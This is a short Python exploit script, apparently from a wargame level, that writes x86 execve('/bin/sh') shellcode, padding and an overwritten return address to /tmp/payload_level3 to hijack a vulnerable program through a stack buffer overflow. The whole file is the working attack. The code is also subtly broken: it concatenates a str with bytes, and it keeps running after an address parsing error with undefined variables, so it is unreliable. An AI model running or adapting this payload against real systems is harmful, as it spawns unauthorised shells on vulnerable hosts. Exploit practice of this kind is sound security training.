import struct
import sys


def craft_payload(target_address, buffer_size, exploit_file):
	payload = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + b'A' * buffer_size
	payload += struct.pack('<I', target_address)
	with open(exploit_file, "wb") as file1:
		file1.write(payload)


def main():
	if len(sys.argv) != 3:
		return
	output_string = ""
	exploit_file = "/tmp/payload_level3"
	try:
		address = int(sys.argv[1].replace('0x', ''), 16)
		offset = int(sys.argv[2])
	except:
		print("not an a valid address")
	print("crafting payload...")
	craft_payload(address, offset, exploit_file)
	print("done:\n{}".format(exploit_file))


if __name__ == "__main__":
	main()
